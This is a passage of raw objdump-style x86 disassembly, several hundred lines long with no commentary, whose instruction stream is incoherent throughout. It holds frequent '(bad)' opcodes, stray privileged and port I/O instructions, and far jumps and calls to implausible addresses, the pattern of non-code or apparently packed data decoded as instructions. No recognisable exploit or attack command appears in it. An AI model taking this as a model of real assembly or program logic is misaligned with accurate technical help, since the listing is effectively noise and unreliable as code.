  409aa3:	xor    DWORD PTR [edi+eiz*2],0xc729594a
  409aaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409aab:	iret   
  409aac:	inc    esp
  409aad:	aaa    
  409aae:	and    al,BYTE PTR [esi+esi*8-0xc]
  409ab2:	cmp    cl,BYTE PTR [edx-0x2a]
  409ab5:	scas   eax,DWORD PTR es:[edi]
  409ab6:	mov    bh,0xb7
  409ab8:	push   es
  409ab9:	loope  0x409aeb
  409abb:	clc    
  409abc:	call   0x2023:0xeb3988e9
  409ac3:	cwde   
  409ac4:	xchg   DWORD PTR [eax+0x77],edi
  409ac7:	stos   BYTE PTR es:[edi],al
  409ac8:	sub    eax,0x8da0275
  409acd:	outs   dx,DWORD PTR ds:[esi]
  409ace:	push   eax
  409acf:	ds mov esp,0x969e457f
  409ad5:	xchg   esp,eax
  409ad6:	test   al,0x6f
  409ad8:	popa   
  409ad9:	sbb    DWORD PTR [edx-0x34],esi
  409adc:	(bad)  
  409add:	xchg   ebx,eax
  409ade:	lods   eax,DWORD PTR ds:[esi]
  409adf:	mov    bh,0x39
  409ae1:	jmp    0x3fa64750
  409ae6:	mov    edi,0x148933d
  409aeb:	das    
  409aec:	(bad)  
  409aed:	jg     0x409ac8
  409aef:	repnz lods eax,DWORD PTR ds:[esi]
  409af1:	sbb    esp,DWORD PTR [esi]
  409af3:	fwait
  409af4:	ss push cs
  409af6:	cmp    ebp,DWORD PTR [ebp+ebp*4+0x6]
  409afa:	aaa    
  409afb:	mov    ss,WORD PTR [ecx]
  409afd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409afe:	cmp    DWORD PTR [edx-0x5c],ecx
  409b01:	(bad)  
  409b03:	cmp    al,0x88
  409b05:	lods   eax,DWORD PTR ds:[esi]
  409b06:	jmp    0x409aa1
  409b08:	shl    ebp,cl
  409b0a:	jecxz  0x409afb
  409b0c:	jbe    0x409b12
  409b0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b0f:	js     0x409b4d
  409b11:	push   ss
  409b12:	cld    
  409b13:	push   ds
  409b14:	das    
  409b15:	pusha  
  409b16:	push   edx
  409b17:	fdiv   QWORD PTR cs:[edx+0x7510bab6]
  409b1e:	sbb    BYTE PTR [esi+0x7c],0xb2
  409b22:	sub    eax,DWORD PTR [edx+ebp*4+0x4af8062a]
  409b29:	imul   ecx,DWORD PTR [eax],0x2ed5ff4c
  409b2f:	or     ebp,DWORD PTR [edi]
  409b31:	add    dh,BYTE PTR [esi+0x70]
  409b34:	fwait
  409b35:	mov    ecx,0x3f6a11ec
  409b3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b3b:	add    dl,BYTE PTR [ecx+edx*8-0xb]
  409b3f:	xor    BYTE PTR [ebx],al
  409b41:	sub    al,0x1c
  409b43:	pop    ebx
  409b44:	repnz lea esi,[ebx-0x30]
  409b48:	clc    
  409b49:	xor    ch,BYTE PTR [ecx+0x43]
  409b4c:	aas    
  409b4d:	sahf   
  409b4e:	or     al,dh
  409b50:	push   es
  409b51:	or     eax,0x197b6cd9
  409b56:	(bad)  
  409b58:	jae    0x409b49
  409b5a:	mov    ch,BYTE PTR [ecx-0x7e1b6b0e]
  409b60:	mov    dh,0x5c
  409b62:	test   eax,0xc7ee8555
  409b67:	popf   
  409b68:	xchg   edi,eax
  409b69:	ret    
  409b6a:	pop    ds
  409b6b:	(bad)  
  409b6d:	(bad)  
  409b6e:	cmp    DWORD PTR [edi+0x2d],esi
  409b71:	arpl   WORD PTR [esp+ebp*2],si
  409b74:	popa   
  409b75:	adc    eax,0x626b7b5
  409b7a:	imul   eax,DWORD PTR [edi-0x52ba1b08],0x5f
  409b81:	push   esi
  409b82:	je     0x409b88
  409b84:	lods   eax,DWORD PTR ds:[esi]
  409b85:	fs mov ebx,ebp
  409b88:	sbb    esp,esi
  409b8a:	fild   DWORD PTR [edi+ecx*4]
  409b8d:	lds    edx,FWORD PTR [ecx]
  409b8f:	(bad)  
  409b90:	pop    ebp
  409b91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b92:	and    DWORD PTR [edi+0x3b06657a],ebx
  409b98:	in     al,dx
  409b99:	mov    ebp,DWORD PTR [ebx-0x43]
  409b9c:	dec    edx
  409b9d:	sbb    bh,al
  409b9f:	std    
  409ba0:	mov    esp,DWORD PTR [ecx-0x5b2967f1]
  409ba6:	fstp   DWORD PTR [ecx+0x20c0cf94]
  409bac:	push   0xffffffb6
  409bae:	pop    edx
  409baf:	jle    0x409b4e
  409bb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bb2:	sbb    BYTE PTR [ebx-0x2edb751d],0xcf
  409bb9:	add    DWORD PTR [ecx],ebx
  409bbb:	lea    ecx,[edi+0x78]
  409bbe:	ds faddp st(1),st
  409bc1:	out    dx,eax
  409bc2:	sub    bh,ah
  409bc4:	push   ss
  409bc5:	or     ch,cl
  409bc7:	pop    edx
  409bc8:	mov    cl,BYTE PTR [edx+0x1b]
  409bcb:	xchg   ecx,eax
  409bcc:	sti    
  409bcd:	nop
  409bce:	mov    DWORD PTR [ebp-0x4ef06488],esi
  409bd4:	adc    ecx,esi
  409bd6:	mul    BYTE PTR [ebp+0x6441738a]
  409bdc:	xchg   ebp,eax
  409bdd:	out    dx,eax
  409bde:	adc    edx,DWORD PTR [ecx-0xd]
  409be1:	mov    ds:0x1febd44c,eax
  409be6:	dec    ecx
  409be7:	dec    ecx
  409be8:	(bad)  [edi+ecx*1-0x40]
  409bec:	imul   esi,DWORD PTR [edx+0x49d92629],0x32
  409bf3:	sbb    DWORD PTR [edi+0xb],edx
  409bf6:	sub    al,0xdb
  409bf8:	xor    cl,cl
  409bfa:	fcom   QWORD PTR [esi]
  409bfc:	pop    esp
  409bfd:	(bad)  
  409bfe:	shl    esp,1
  409c00:	ins    BYTE PTR es:[edi],dx
  409c01:	mov    eax,fs
  409c03:	mov    esp,DWORD PTR [ebx+0x11]
  409c06:	mov    ebp,0x50b57572
  409c0b:	xchg   esp,eax
  409c0c:	mov    edi,0xc54db9e3
  409c11:	sbb    eax,0xf4e8fb5c
  409c16:	sbb    ch,bl
  409c18:	push   ebx
  409c19:	ret    0xe81e
  409c1c:	test   BYTE PTR [edx+0x407f60df],bl
  409c22:	icebp  
  409c23:	mov    cl,0x7d
  409c25:	mov    bl,BYTE PTR [esi+0x303417e0]
  409c2b:	outs   dx,BYTE PTR ds:[esi]
  409c2c:	cmp    edi,DWORD PTR [edi-0x158eba19]
  409c32:	pop    esi
  409c33:	jmp    0x9412:0x2fe049d2
  409c3a:	sbb    BYTE PTR [edx+edx*1+0x60],bl
  409c3e:	sahf   
  409c3f:	sahf   
  409c40:	aam    0x8a
  409c42:	xchg   BYTE PTR [edi],dl
  409c44:	nop
  409c45:	in     eax,dx
  409c46:	or     BYTE PTR [ecx+edx*1-0x1c],bh
  409c4a:	mov    ebx,0x7dff03ea
  409c4f:	mov    BYTE PTR [eax-0x1215f742],al
  409c55:	inc    eax
  409c56:	mov    edx,0xd1aa2862
  409c5b:	sar    BYTE PTR [ebx-0x6c64ffbe],1
  409c61:	adc    eax,DWORD PTR [ebp-0x21ba20d9]
  409c67:	mov    esi,0xb20bb110
  409c6c:	adc    ebx,DWORD PTR [ecx+0x12fdc4cd]
  409c72:	idiv   edi
  409c74:	(bad)  
  409c75:	(bad)  
  409c76:	ja     0x409c67
  409c78:	mov    al,ds:0x61bb358f
  409c7d:	sub    eax,edx
  409c7f:	add    ch,BYTE PTR [edx-0x3d]
  409c82:	int3   
  409c83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c84:	push   ebx
  409c85:	inc    ecx
  409c86:	aam    0x9b
  409c88:	xor    al,0xe2
  409c8a:	div    BYTE PTR [esi]
  409c8c:	enter  0x3e7e,0x49
  409c90:	jecxz  0x409d0d
  409c92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c93:	push   ebx
  409c94:	push   ecx
  409c95:	fucomip st,st(7)
  409c97:	cld    
  409c98:	je     0x409c56
  409c9a:	es dec esi
  409c9c:	loop   0x409c2c
  409c9e:	cmp    esi,edx
  409ca0:	push   cs
  409ca1:	je     0x409cb1
  409ca3:	jne    0x409ca9
  409ca5:	fistp  QWORD PTR [edx]
  409ca7:	js     0x409cc3
  409ca9:	jno    0x409ce0
  409cab:	mov    dh,0xf8
  409cad:	fimul  DWORD PTR [eax+0x3e]
  409cb0:	sub    al,0x26
  409cb2:	cli    
  409cb3:	or     cl,BYTE PTR ds:0x1375ffd6
  409cb9:	adc    DWORD PTR [eax-0x39b7bc7f],ebx
  409cbf:	mov    cl,0x20
  409cc1:	cmc    
  409cc2:	inc    eax
  409cc3:	dec    esp
  409cc4:	jp     0x409d0e
  409cc6:	xor    BYTE PTR [ebp+0x60],cl
  409cc9:	out    dx,eax
  409cca:	mov    DWORD PTR [ebp-0x3f],esp
  409ccd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cce:	mov    gs:0xe5124493,al
  409cd4:	jg     0x409d44
  409cd6:	add    ah,ch
  409cd8:	cmp    eax,DWORD PTR [edi-0x41]
  409cdb:	mov    fs,WORD PTR [edi+ebp*2-0x37cbc93]
  409ce2:	dec    edx
  409ce3:	and    al,0xde
  409ce5:	retf   0xdeaf
  409ce8:	dec    eax
  409ce9:	lahf   
  409cea:	push   edi
  409ceb:	in     al,0x96
  409ced:	nop
  409cee:	sub    bh,ah
  409cf0:	imul   ecx,DWORD PTR [edi+0x43],0x31
  409cf4:	dec    ebx
  409cf5:	ror    DWORD PTR [ebp-0x424287fe],0x6c
  409cfc:	icebp  
  409cfd:	sbb    esp,eax
  409cff:	sti    
  409d00:	mov    ds:0xde3d34b8,eax
  409d05:	in     eax,0x72
  409d07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d08:	(bad)  
  409d09:	iret   
  409d0a:	jbe    0x409c9e
  409d0c:	sub    edx,esi
  409d0e:	mov    dh,BYTE PTR [ebp-0x71]
  409d11:	mov    cl,0xb7
  409d13:	xor    BYTE PTR [ebx+ecx*8],bh
  409d16:	mov    ch,0xd5
  409d18:	cmp    edx,0x3d
  409d1b:	push   esp
  409d1c:	xchg   edi,eax
  409d1d:	icebp  
  409d1e:	cli    
  409d1f:	pop    ecx
  409d20:	jb     0x409cf9
  409d22:	mov    eax,0x24b0ead5
  409d27:	inc    ebp
  409d28:	dec    ecx
  409d29:	enter  0xe60c,0x68
  409d2d:	shr    esp,cl
  409d2f:	sbb    eax,0x11865c1f
  409d34:	popf   
  409d35:	push   0x1a
  409d37:	mov    fs,ebp
  409d39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d3a:	xor    edi,DWORD PTR ds:0x5cf876f7
  409d40:	jbe    0x409cf4
  409d42:	mov    ds:0xba88b855,al
  409d47:	pop    edi
  409d48:	fadd   QWORD PTR [edi+0x73f704db]
  409d4e:	adc    eax,0xf6d21c5a
  409d53:	or     cl,BYTE PTR [ebp+0x4c]
  409d56:	sbb    BYTE PTR [eax+0x78],ah
  409d59:	dec    ebp
  409d5a:	jnp    0x409ce3
  409d5c:	data16 jae 0x409d32
  409d5f:	out    0xfb,eax
  409d61:	in     eax,0x4c
  409d63:	mov    dl,0xc0
  409d65:	inc    edx
  409d66:	xor    dl,BYTE PTR [eax+0x5358b0d9]
  409d6c:	xchg   edi,eax
  409d6d:	jae    0x409d56
  409d6f:	xor    DWORD PTR [ebx+0xe],0x987d7fab
  409d76:	in     eax,dx
  409d77:	push   0x14f244c
  409d7c:	ja     0x409d6e
  409d7e:	in     al,dx
  409d7f:	adc    al,0xcd
  409d81:	arpl   ax,cx
  409d83:	jl     0x409d4f
  409d85:	out    dx,al
  409d86:	inc    edi
  409d87:	in     eax,0xcf
  409d89:	ficomp DWORD PTR [ecx-0x5b]
  409d8c:	adc    ch,BYTE PTR [ecx+ecx*1-0x71]
  409d90:	aam    0xfd
  409d92:	test   dh,cl
  409d94:	inc    ecx
  409d95:	cmp    al,0xf7
  409d97:	push   esi
  409d98:	int3   
  409d99:	mov    esi,0xe3493230
  409d9e:	rcr    dl,cl
  409da0:	push   cs
  409da1:	cmp    BYTE PTR [eax-0x5f8e7a43],bl
  409da7:	jnp    0x409de2
  409da9:	inc    ebx
  409daa:	enter  0x5c0,0xcc
  409dae:	mov    BYTE PTR [ecx],dl
  409db0:	int3   
  409db1:	in     eax,0x5e
  409db3:	ins    BYTE PTR es:[edi],dx
  409db4:	sbb    ebx,esi
  409db6:	adc    DWORD PTR [esp+edx*4+0x62],ebx
  409dba:	inc    esi
  409dbb:	push   esi
  409dbc:	or     ebx,DWORD PTR [ebx+0x2e06b51e]
  409dc2:	mov    dl,0x7b
  409dc4:	push   esi
  409dc5:	es dec ebp
  409dc7:	pop    edi
  409dc8:	mov    ch,0x5a
  409dca:	stc    
  409dcb:	inc    ebp
  409dcc:	scas   al,BYTE PTR es:[edi]
  409dcd:	ds in  al,0x5b
  409dd0:	xchg   edi,eax
  409dd1:	mov    dl,0x1d
  409dd3:	add    edi,esi
  409dd5:	mov    al,ds:0xf4ffff6e
  409dda:	repz pop ds
  409ddc:	cmp    eax,0x84d56938
  409de1:	pop    esi
  409de2:	and    ecx,edx
  409de4:	sar    bl,0x16
  409de7:	cmp    DWORD PTR [ebp-0x2aa5a510],edx
  409ded:	push   cs
  409dee:	pusha  
  409def:	pop    edx
  409df0:	sahf   
  409df1:	leave  
  409df2:	mov    ebp,0xc18ebe83
  409df7:	scas   eax,DWORD PTR es:[edi]
  409df8:	into   
  409df9:	aaa    
  409dfa:	jo     0x409e5f
  409dfc:	int3   
  409dfd:	add    edx,edi
  409dff:	pop    ebx
  409e00:	dec    esi
  409e01:	enter  0x6c99,0x7c
  409e05:	sub    ecx,0x5a
  409e08:	sti    
  409e09:	pop    eax
  409e0a:	lahf   
  409e0b:	push   0xfffffffd
  409e0d:	imul   ebp,DWORD PTR [edi+0x5a],0xfe14522c
  409e14:	xchg   DWORD PTR [ebx+0x28],ebp
  409e17:	daa    
  409e18:	sub    eax,0x186a9ea8
  409e1d:	repnz out 0xcb,al
  409e20:	pop    esp
  409e21:	cmp    BYTE PTR [edx],ah
  409e23:	xchg   esp,eax
  409e25:	(bad)  
  409e26:	aad    0x62
  409e28:	dec    ebx
  409e29:	pop    ecx
  409e2a:	test   BYTE PTR [ebp+eax*1-0x59],dl
  409e2e:	push   es
  409e2f:	jmp    0x6f16b83a
  409e34:	mov    eax,ds:0xa0018252
  409e39:	xor    DWORD PTR [ecx-0x4985f09],ecx
  409e3f:	fisub  WORD PTR [edx-0x31]
  409e42:	ror    BYTE PTR [esi+0x4b79cd7f],1
  409e48:	je     0x409e0a
  409e4a:	xchg   ebx,eax
  409e4b:	outs   dx,BYTE PTR ds:[esi]
  409e4c:	add    eax,0x7448e1fe
  409e51:	cdq    
  409e52:	pop    edx
  409e53:	xor    edx,DWORD PTR [ebx-0x5f]
  409e56:	shl    dl,0x25
  409e59:	mov    ah,0xca
  409e5b:	leave  
  409e5c:	std    
  409e5d:	push   eax
  409e5e:	jp     0x409ea4
  409e60:	imul   ebx,DWORD PTR [ebx+0x1c00cb26],0x41
  409e67:	nop
  409e68:	sub    eax,eax
  409e6a:	dec    ebp
  409e6b:	(bad)  
  409e6c:	std    
  409e6d:	call   0x45983ba2
  409e72:	sbb    eax,0x6ef10558
  409e77:	es push ecx
  409e79:	xchg   ebp,eax
  409e7a:	push   edx
  409e7b:	dec    esi
  409e7c:	sbb    DWORD PTR [ebx],ebp
  409e7e:	rcl    BYTE PTR [ebp+0x7c706c61],cl
  409e84:	aaa    
  409e85:	int3   
  409e86:	add    esi,DWORD PTR [eax+0x268d5401]
  409e8c:	xchg   esp,eax
  409e8d:	pop    edi
  409e8e:	add    al,0x26
  409e90:	push   ecx
  409e91:	inc    edi
  409e92:	or     eax,ebx
  409e94:	jg     0x409e80
  409e96:	imul   esi,DWORD PTR [edx+ebx*8+0x11],0x1a1abe74
  409e9e:	mov    al,0x15
  409ea0:	popf   
  409ea1:	add    bh,BYTE PTR [edx+0x36417cf]
  409ea7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ea8:	xchg   DWORD PTR [ebp+eax*1+0x3d5e566a],eax
  409eaf:	pop    ss
  409eb0:	iret   
  409eb1:	inc    ebp
  409eb2:	lods   eax,DWORD PTR ds:[esi]
  409eb3:	out    dx,al
  409eb4:	xchg   DWORD PTR [eax+0x5a7d0412],ebp
  409eba:	ja     0x409e85
  409ebc:	jp     0x409e6b
  409ebe:	pop    ds
  409ebf:	cmp    cl,BYTE PTR [ebp-0x4d7d8d4e]
  409ec5:	jb     0x409e55
  409ec7:	ins    DWORD PTR es:[edi],dx
  409ec8:	xchg   ecx,eax
  409ec9:	jb     0x409e77
  409ecb:	and    DWORD PTR [ecx+0x5b],esi
  409ece:	fistp  WORD PTR [ecx-0x24eccd0f]
  409ed4:	retf   0xfc9
  409ed7:	cmp    BYTE PTR [esi],dl
  409ed9:	add    al,0xb5
  409edb:	aas    
  409edc:	xchg   esp,eax
  409edd:	icebp  
  409ede:	sti    
  409edf:	pop    edx
  409ee0:	xchg   DWORD PTR [edx-0x5],ecx
  409ee3:	jbe    0x409f3f
  409ee5:	das    
  409ee6:	push   ebx
  409ee7:	mov    bh,0x22
  409ee9:	or     ah,BYTE PTR [edi*8-0x1befd0b6]
  409ef0:	mov    ebx,0x632e2eb0
  409ef5:	jne    0x409e89
  409ef7:	mov    ?,WORD PTR [ebx]
  409ef9:	in     eax,dx
  409efa:	xor    DWORD PTR [ebx+0x60],esi
  409efd:	stos   DWORD PTR es:[edi],eax
  409efe:	ss in  eax,dx
  409f00:	stos   DWORD PTR es:[edi],eax
  409f01:	fsubr  DWORD PTR [edx]
  409f03:	xchg   ecx,eax
  409f04:	(bad)  
  409f05:	in     eax,dx
  409f06:	stos   BYTE PTR es:[edi],al
  409f07:	mov    ds:0xd2ef241a,eax
  409f0c:	add    eax,0xa273a398
  409f11:	mov    cl,0xa9
  409f13:	test   bl,al
  409f15:	shl    BYTE PTR [ebp-0x6dfc6339],0xd5
  409f1c:	(bad)  
  409f1d:	into   
  409f1e:	dec    ecx
  409f1f:	(bad)  
  409f20:	mov    ah,BYTE PTR [eax+0x2518e793]
  409f26:	in     eax,dx
  409f27:	mov    eax,DWORD PTR [ebx+edx*2+0x1f11ea98]
  409f2e:	dec    edx
  409f2f:	retf   
  409f30:	shr    esp,1
  409f32:	sub    BYTE PTR [edx+0x6cbc934f],0x2c
  409f39:	xor    esp,ebp
  409f3b:	(bad)  
  409f3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f3d:	push   ebp
  409f3e:	mov    DWORD PTR [eax+ebp*1+0x5c],ecx
  409f42:	xchg   esi,eax
  409f43:	jae    0x409f13
  409f45:	inc    ecx
  409f46:	retf   
  409f47:	sbb    al,0xfc
  409f49:	ret    0xb61
  409f4c:	loop   0x409f8a
  409f4e:	inc    edi
  409f4f:	mov    ch,0x6
  409f51:	sbb    BYTE PTR [edx+ebp*2+0x5c194013],cl
  409f58:	outs   dx,BYTE PTR ds:[esi]
  409f59:	into   
  409f5a:	or     DWORD PTR [ebp+0x19],esp
  409f5d:	mov    al,0xa
  409f5f:	std    
  409f60:	repz jns 0x409f0c
  409f63:	js     0x409faa
  409f65:	test   DWORD PTR [ebx],edx
  409f67:	fdivr  DWORD PTR [esi]
  409f69:	enter  0xc69e,0xf8
  409f6d:	pusha  
  409f6e:	lods   al,BYTE PTR gs:[esi]
  409f70:	jbe    0x409fe6
  409f72:	jns    0x409f8a
  409f74:	xchg   esi,eax
  409f75:	stc    
  409f76:	mov    bl,0xb7
  409f78:	aaa    
  409f79:	inc    ebp
  409f7a:	pop    ebp
  409f7b:	pop    eax
  409f7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f7d:	jmp    0x3a1d34b7
  409f82:	(bad)
  409f85:	inc    edi
  409f86:	cmp    al,0x95
  409f88:	mov    bl,0xbb
  409f8a:	ja     0x409f84
  409f8c:	stos   BYTE PTR es:[edi],al
  409f8d:	push   es
  409f8e:	pop    esi
  409f8f:	push   ss
  409f90:	dec    esp
  409f91:	push   0xffffffd7
  409f93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f94:	push   edi
  409f95:	pop    eax
  409f96:	sub    DWORD PTR [eax+0x55],esp
  409f99:	xchg   DWORD PTR [ebp+0x5f5fd98d],ecx
  409f9f:	sub    BYTE PTR [edi+ecx*1-0x77],bl
  409fa3:	cmp    cl,dh
  409fa5:	inc    esi
  409fa6:	push   esi
  409fa7:	cmp    eax,0xbe8e1a78
  409fac:	sub    ecx,DWORD PTR cs:0x877f3c64
  409fb3:	addr16 xchg ebx,eax
  409fb5:	fwait
  409fb6:	xchg   edx,eax
  409fb7:	lea    esi,[ebx]
  409fb9:	jns    0x40a01b
  409fbb:	xchg   esp,eax
  409fbc:	and    DWORD PTR [eax+0x70133a8d],esi
  409fc2:	loopne 0x409f4f
  409fc4:	ret    0xa1ee
  409fc7:	(bad)  
  409fc8:	test   ebx,0xa8e89dfe
  409fce:	int3   
  409fcf:	push   ss
  409fd0:	inc    edi
  409fd1:	and    BYTE PTR [edx],dh
  409fd3:	ror    DWORD PTR [ebp+edx*8-0x5914872e],1
  409fda:	add    DWORD PTR [edx],ebp
  409fdc:	push   esi
  409fdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fde:	sbb    BYTE PTR [ebx+0x3b],0xf2
  409fe2:	in     al,dx
  409fe3:	sbb    eax,0x6ccbcc8a
  409fe8:	xchg   esi,eax
  409fe9:	push   0xffffffce
  409feb:	jnp    0x409f77
  409fed:	test   DWORD PTR [eax+0x35],ebp
  409ff0:	push   eax
  409ff1:	aas    
  409ff2:	fwait
  409ff3:	or     DWORD PTR ds:0x418a39ee,esi
  409ff9:	popf   
  409ffa:	and    eax,0xfaee4a83
  409fff:	inc    ebx
  40a000:	sbb    DWORD PTR [ecx-0x604bbc6d],ecx
  40a006:	pusha  
  40a007:	cmp    al,0x54
  40a009:	rcr    BYTE PTR [eax],0x8f
  40a00c:	mov    al,ds:0x9d289e95
  40a011:	xchg   ebx,eax
  40a012:	add    al,0xd1
  40a014:	hlt    
  40a015:	lods   al,BYTE PTR ds:[esi]
  40a016:	cld    
  40a017:	jmp    0x389e3c18
  40a01c:	(bad)  
  40a01d:	fcmovbe st,st(4)
  40a01f:	sub    al,0x5e
  40a021:	je     0x409ffc
  40a023:	neg    BYTE PTR [ecx]
  40a025:	iret   
  40a026:	ins    DWORD PTR es:[edi],dx
  40a027:	xchg   ecx,eax
  40a028:	or     BYTE PTR [ebp+0x0],cl
  40a02b:	sar    bl,1
  40a02d:	(bad)  
  40a02e:	inc    esp
  40a02f:	fcmovu st,st(4)
  40a031:	out    dx,eax
  40a032:	dec    edx
  40a033:	dec    eax
  40a034:	cmp    al,0x2d
  40a036:	repnz xchg ebp,eax
  40a038:	sbb    BYTE PTR [eax+0x4b],0x88
  40a03c:	and    DWORD PTR [edx+0x77],edi
  40a03f:	(bad)  
  40a040:	cli    
  40a041:	xchg   ebp,eax
  40a042:	stos   BYTE PTR es:[edi],al
  40a043:	lods   al,BYTE PTR ds:[esi]
  40a044:	push   0xffffffe0
  40a046:	dec    ebx
  40a047:	int    0x50
  40a049:	sbb    BYTE PTR [eax+0x2b95204b],dl
  40a04f:	jle    0x40a053
  40a051:	iret   
  40a052:	sub    eax,DWORD PTR [ebx-0x37133d9b]
  40a058:	fimul  DWORD PTR ds:0xd3729d2d
  40a05e:	test   al,0x30
  40a060:	rcr    edx,0xe0
  40a063:	into   
  40a064:	xchg   edx,eax
  40a065:	sbb    eax,0x43214e76
  40a06a:	hlt    
  40a06b:	and    bl,BYTE PTR [esi-0x45a40eaa]
  40a071:	mov    eax,ds:0xd8b0f581
  40a076:	sbb    BYTE PTR [ebx-0x357dc81f],0x7b
  40a07d:	xchg   ax,ax
  40a07f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a080:	pop    ss
  40a081:	pop    DWORD PTR [edx]
  40a083:	push   es
  40a084:	xor    DWORD PTR [ecx+0x35],ecx
  40a087:	ficomp DWORD PTR [ebx-0xa84ccd2]
  40a08d:	pop    esi
  40a08e:	repz mov bl,0x4d
  40a091:	push   edx
  40a092:	stos   DWORD PTR es:[edi],eax
  40a093:	adc    eax,0xcd80e7b1
  40a098:	xchg   edx,eax
  40a099:	out    dx,eax
  40a09a:	mov    ah,0x16
  40a09c:	shl    BYTE PTR [edx+ecx*4],0x2
  40a0a0:	aas    
  40a0a1:	and    cl,BYTE PTR [edx+0x7f57b08a]
  40a0a7:	mov    dl,0x4f
  40a0a9:	fsub   QWORD PTR [edi]
  40a0ab:	or     al,0xfd
  40a0ad:	mov    esp,0x673e8957
  40a0b2:	xchg   esp,eax
  40a0b3:	push   esp
  40a0b4:	mov    edx,fs
  40a0b6:	fdivr  QWORD PTR [eax+0x2e036fd8]
  40a0bc:	xor    ecx,DWORD PTR [ebx]
  40a0be:	dec    esi
  40a0bf:	dec    eax
  40a0c0:	sbb    dl,ch
  40a0c2:	call   0x3e07:0xa3977783
  40a0c9:	mov    edx,0xf298bcfb
  40a0ce:	lock and ebp,edx
  40a0d1:	test   DWORD PTR [edi+0x8],eax
  40a0d4:	pop    es
  40a0d5:	xor    BYTE PTR [edi+0x1f],al
  40a0d8:	and    al,0xd
  40a0da:	mov    bl,0xf1
  40a0dc:	pop    es
  40a0dd:	push   eax
  40a0de:	adc    BYTE PTR [ebp+edi*4+0x53c9f199],0xc0
  40a0e6:	sbb    al,0x1d
  40a0e8:	btc    DWORD PTR [edi],0x98
  40a0ec:	ins    DWORD PTR es:[edi],dx
  40a0ed:	push   esp
  40a0ee:	sbb    edx,DWORD PTR [eax]
  40a0f0:	xchg   esi,eax
  40a0f1:	div    edi
  40a0f3:	push   esp
  40a0f4:	test   al,0x28
  40a0f6:	fsubr  st,st(0)
  40a0f8:	mov    WORD PTR [eax],?
  40a0fa:	cmp    BYTE PTR [edx+0x61],ch
  40a0fd:	and    BYTE PTR [edi-0x79],dl
  40a100:	xor    eax,0x9e2b27ac
  40a105:	adc    BYTE PTR [ebp+0x320ea606],bl
  40a10b:	int    0x86
  40a10d:	xchg   edx,eax
  40a10e:	ffreep st(7)
  40a110:	xchg   edx,eax
  40a111:	test   al,0x10
  40a113:	dec    eax
  40a114:	jb     0x40a108
  40a116:	test   al,cl
  40a118:	pusha  
  40a119:	xchg   edx,eax
  40a11a:	dec    ebx
  40a11b:	sub    DWORD PTR [ebx+0x29],ebx
  40a11e:	and    ebx,DWORD PTR [edi+0x1d67d6ac]
  40a124:	scas   eax,DWORD PTR es:[edi]
  40a125:	mov    esi,0x1da040e2
  40a12a:	mov    ch,0x7d
  40a12c:	and    BYTE PTR [ecx-0x25],cl
  40a12f:	icebp  
  40a130:	loop   0x40a0c8
  40a132:	inc    edi
  40a133:	clc    
  40a134:	sub    BYTE PTR [eax+0x5962bacf],cl
  40a13a:	pop    si
  40a13c:	dec    edx
  40a13d:	mov    al,ds:0x6acb2d3a
  40a142:	or     eax,0xfceda40e
  40a147:	inc    edx
  40a148:	mov    ah,0x20
  40a14a:	sub    BYTE PTR [edx],cl
  40a14c:	popf   
  40a14d:	pop    ss
  40a14e:	stos   BYTE PTR es:[edi],al
  40a14f:	je     0x40a100
  40a151:	mov    ebx,0xf5db4a64
  40a156:	sub    ah,BYTE PTR [ebp+0x37f667cb]
  40a15c:	mov    ah,0xe7
  40a15e:	stc    
  40a15f:	jp     0x40a119
  40a161:	dec    ebx
  40a162:	jle    0x40a1cd
  40a164:	stc    
  40a165:	or     al,0xf9
  40a167:	les    edi,FWORD PTR [esi+0x25]
  40a16a:	inc    ebx
  40a16b:	and    al,0x60
  40a16d:	and    ebx,DWORD PTR [ebp-0x10]
  40a170:	in     eax,0xe8
  40a172:	xor    eax,0x3e2692cb
  40a177:	call   0x563bb915
  40a17c:	fidiv  WORD PTR [eax-0x4a]
  40a17f:	lock and al,0x9e
  40a182:	test   eax,0x3aab4b80
  40a187:	jns    0x40a1df
  40a189:	adc    al,0x32
  40a18b:	loope  0x40a11f
  40a18d:	int3   
  40a18e:	ss dec ebp
  40a190:	pushf  
  40a191:	push   edx
  40a192:	cmp    DWORD PTR [ecx+esi*4-0x19],0x4e5e99fc
  40a19a:	loope  0x40a1d8
  40a19c:	neg    DWORD PTR [ebp-0xf]
  40a19f:	xchg   edi,eax
  40a1a0:	dec    ebx
  40a1a1:	push   cs
  40a1a2:	or     BYTE PTR [ecx],cl
  40a1a4:	sub    esp,DWORD PTR [edi]
  40a1a6:	pop    ss
  40a1a7:	inc    esi
  40a1a8:	mov    ebp,0xf423c116
  40a1ad:	daa    
  40a1ae:	add    al,0x90
  40a1b0:	jo     0x40a1bb
  40a1b2:	sub    esp,eax
  40a1b4:	and    DWORD PTR [eax],ebp
  40a1b6:	rcl    dl,cl
  40a1b8:	lods   eax,DWORD PTR ds:[esi]
  40a1b9:	(bad)  ds:[ebx+0x7339d421]
  40a1c0:	aam    0x4f
  40a1c2:	xchg   ebx,eax
  40a1c3:	stos   BYTE PTR es:[edi],al
  40a1c4:	mov    edx,0xd8ff8b22
  40a1c9:	test   DWORD PTR [eax],esi
  40a1cb:	mov    eax,0xb01d2ee2
  40a1d0:	mov    ebx,0x4c5c11a2
  40a1d5:	stc    
  40a1d6:	aas    
  40a1d7:	(bad)  
  40a1d9:	cld    
  40a1da:	inc    ebx
  40a1db:	daa    
  40a1dc:	mov    edx,0x3b512c51
